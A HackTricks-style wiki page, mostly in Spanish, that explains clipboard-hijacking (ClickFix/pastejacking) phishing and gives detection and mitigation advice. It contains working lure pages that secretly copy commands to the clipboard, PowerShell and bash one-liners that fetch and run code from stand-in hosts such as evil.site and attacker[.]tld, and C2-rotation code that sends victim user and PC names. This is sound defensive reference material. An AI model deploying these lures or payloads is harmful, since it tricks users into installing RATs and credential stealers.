# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – consejo antiguo pero aún válido

## Visión general

Clipboard hijacking – also known as *pastejacking* – aprovecha el hecho de que los usuarios rutinariamente copian y pegan comandos sin inspeccionarlos. Una página web maliciosa (o cualquier contexto con capacidad JavaScript como una aplicación Electron o Desktop) coloca programáticamente texto controlado por el atacante en el portapapeles del sistema. Las víctimas son alentadas, normalmente mediante instrucciones de ingeniería social cuidadosamente elaboradas, a pulsar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o abrir un terminal y *pegar* el contenido del portapapeles, ejecutando inmediatamente comandos arbitrarios.

Porque **no file is downloaded and no attachment is opened**, la técnica evade la mayoría de los controles de seguridad de correo y contenido web que monitorizan attachments, macros o la ejecución directa de comandos. El ataque es por tanto popular en campañas de phishing que distribuyen familias de malware commodity como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Prueba de concepto en JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campañas antiguas usaban `document.execCommand('copy')`, las más nuevas dependen de la asíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## Flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. El JavaScript inyectado **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que almacena silenciosamente en el portapapeles un comando de PowerShell de una sola línea codificado en Base64.
3. Las instrucciones en HTML le dicen a la víctima: *“Presione **Win + R**, pegue el comando y pulse Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más un DLL malicioso (clásico DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej. tarea programada) – y finalmente ejecuta NetSupport RAT / Latrodectus / Lumma Stealer.

### Ejemplo de cadena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) busca en su directorio el archivo `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) vía **curl.exe**, los descifra usando una clave XOR rotatoria `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el descargador JScript dentro de **cscript.exe**
3. Obtiene un payload MSI → coloca `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** lanza un script de PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos y, finalmente, ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen un one‑liner que obtiene y ejecuta JavaScript vía WSH, lo persiste y rota el C2 diariamente. Cadena observada de ejemplo:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para evitar una inspección casual.
- JavaScript se persiste mediante un Startup LNK (WScript/CScript), y selecciona el C2 según el día actual – permitiendo una rápida rotación de dominios.

Fragmento JS mínimo usado para rotar C2s según la fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa comúnmente despliega un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado codificado y fragmentando el tráfico.

Detection ideas specific to this variant
- Árbol de procesos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefactos de inicio: LNK en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript con una ruta JS bajo `%TEMP%`/`%APPDATA%`.
- Telemetría de Registry/RunMRU y línea de comandos que contiene `.split('').reverse().join('')` o `eval(a.responseText)`.
- Repeticiones de `powershell -NoProfile -NonInteractive -Command -` con grandes payloads en stdin para suministrar scripts extensos sin líneas de comando largas.
- Scheduled Tasks que posteriormente ejecutan LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` bajo una tarea/ruta con apariencia de actualizador (p. ej., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Nombres de host y URLs de C2 rotativos diariamente con el patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar clipboard write events seguidos por pegado con Win+R y la ejecución inmediata de `powershell.exe`.

Los Blue-teams pueden combinar clipboard, telemetría de creación de procesos y del registry para localizar abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene un historial de comandos **Win + R** – buscar entradas inusuales en Base64 / ofuscadas.
* Security Event ID **4688** (Process Creation) donde `ParentImage` == `explorer.exe` y `NewProcessName` en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del evento 4688 sospechoso.
* EDR clipboard sensors (si están presentes) – correlacionar `Clipboard Write` seguido inmediatamente por un nuevo proceso PowerShell.

## Páginas de verificación estilo IUAM (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campañas recientes producen en masa páginas de verificación falsas de CDN/browser ("Just a moment…", estilo IUAM) que coaccionan a los usuarios para que copien comandos específicos del OS desde su clipboard hacia consolas nativas. Esto pivota la ejecución fuera del sandbox del navegador y funciona en Windows y macOS.

Rasgos clave de las páginas generadas por el builder
- Detección de OS vía `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionales para OS no soportados para mantener la ilusión.
- Copia automática al clipboard en acciones benignas de UI (checkbox/Copy) mientras el texto visible puede diferir del contenido del clipboard.
- Bloqueo móvil y un popover con instrucciones paso a paso: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Ofuscación opcional e injector de un solo archivo para sobrescribir el DOM de un sitio comprometido con una UI de verificación estilo Tailwind (no se requiere registro de dominio nuevo).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de cerrar el terminal, reduciendo artefactos visibles.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Páginas que enlazan Clipboard API a widgets de verificación; discrepancia entre el texto mostrado y el clipboard payload; branching por `navigator.userAgent`; Tailwind + single-page replace en contextos sospechosos.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- macOS endpoint: Terminal/iTerm que lanzan `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; procesos en segundo plano que sobreviven al cierre del terminal.
- Correlacionar el historial `RunMRU` de Win+R y las escrituras en el clipboard con la creación posterior de procesos de consola.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – deshabilitar el acceso de escritura al clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir un gesto del usuario.
2. Security awareness – enseñar a los usuarios a *teclear* comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear comandos de una sola línea arbitrarios.
4. Network controls – bloquear solicitudes salientes a dominios conocidos de pastejacking y C2 de malware.

## Related Tricks

* **Discord Invite Hijacking** a menudo abusa del mismo enfoque ClickFix tras atraer a los usuarios a un servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
